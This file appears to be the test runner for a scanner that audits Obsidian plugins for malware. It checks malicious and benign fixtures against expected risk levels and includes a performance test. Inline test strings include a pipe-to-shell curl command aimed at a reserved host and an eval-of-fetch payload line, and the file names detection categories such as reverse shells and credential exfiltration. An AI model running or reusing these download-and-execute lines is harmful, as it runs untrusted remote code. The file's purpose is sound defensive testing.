#!/usr/bin/env python3
"""Canary + control tests.

Every mal-* fixture must reach its expected level AND fire its expected pattern; every ok-*
fixture (patterns popular plugins really use) must scan at its expected level (SAFE, or LOW for
disclosed telemetry). Fixtures are inert: hosts are reserved (.invalid / TEST-NET / placeholder
webhook ids) and nothing here is ever executed.

    python tests/run.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))
import obsidian_audit as oa  # noqa: E402

EXPECT = {
    "mal-remote-load": ("CRITICAL", "remote_code_load"),
    "mal-vault-exfil": ("CRITICAL", "vault_exfil"),
    "mal-vault-exfil-esbuild": ("CRITICAL", "vault_exfil"),  # (0, import_obsidian.requestUrl)(...) form
    "mal-ssh-stealer": ("CRITICAL", "credential_exfil"),
    "mal-obfuscated": ("HIGH", "obfuscation"),
    "mal-obfuscated-rc4": ("HIGH", "obfuscation"),
    "mal-miner": ("CRITICAL", "cryptominer"),
    "mal-revshell": ("CRITICAL", "reverse_shell"),
    "mal-wallet": ("HIGH", "wallet_browser_theft"),
    "mal-env-exfil": ("CRITICAL", "env_exfil"),
    "mal-curl-sh": ("CRITICAL", "download_execute"),
    "mal-wiper": ("CRITICAL", "destructive"),
    "mal-telemetry": ("MEDIUM", "telemetry"),
    "mal-keychain-exfil": ("CRITICAL", "credential_exfil"),
    "ok-keychain-own": ("MEDIUM", "keychain_read"),  # another app's secret, sent to its own API: review
    "ok-telemetry-disclosed": ("LOW", "telemetry"),
    "ok-shell-commands": ("MEDIUM", "download_execute"),  # install-hint string + child_process: review, not alarm
}


def main():
    fails = 0
    root = os.path.join(HERE, "fixtures")
    for name in sorted(os.listdir(root)):
        r = oa.scan_plugin(oa.files_from_dir(os.path.join(root, name)), name)
        ids = sorted({f["id"] for f in r["findings"]})
        if name in EXPECT:
            want, fid = EXPECT[name]
            if name.startswith("mal-"):
                ok = oa.SEV_ORDER[r["risk_level"]] >= oa.SEV_ORDER[want] and fid in ids
            else:
                ok = r["risk_level"] == want and fid in ids
        else:
            want, fid = "SAFE", "-"
            ok = r["risk_level"] == "SAFE"
        fails += not ok
        print("%s %-24s got=%-8s want=%-8s %-20s %s" % (
            "PASS" if ok else "FAIL", name, r["risk_level"], want, fid, ids))
    checks = [
        (oa.scan("cp.exec('curl https://x.invalid/a | bash')")["risk_level"] == "CRITICAL", "--text pipe-to-shell"),
        (oa.scan("var g = Function('return this')();")["risk_level"] == "SAFE", "--text globalThis polyfill"),
        (oa.scan("x" * 50000 + ";eval(await (await fetch(u)).text());")["risk_level"] == "CRITICAL",
         "minified long line windowing"),
    ]
    # Performance regression: a 5 MB single-line minified bundle stuffed with the tokens
    # that used to trigger quadratic work (thousands of same-line matches, long whitespace
    # runs after `eval(`, `rm -` letter runs, fetch( chains) must scan in a few seconds.
    import time
    unit = ('a.fetch(u),eval(x),"http://1.2.3.4:80/",rm -' + "r" * 40 + ' ,x.write(p+"plugins/"+q),'
            'eval(' + " " * 300 + '(fetch(' + " " * 300 + 'u)),b(12,"a&b!"),e.pipe(s),')
    big = (unit * (5000000 // len(unit) + 1))[:5000000]
    t0 = time.time()
    oa.scan_plugin({"main.js": big}, "perf")
    dt = time.time() - t0
    checks.append((dt < 8.0, "5 MB single-line bundle scanned in %.1fs (< 8s)" % dt))
    for ok, label in checks:
        fails += not ok
        print("%s %s" % ("PASS" if ok else "FAIL", label))
    print("\n%d failure(s)" % fails)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
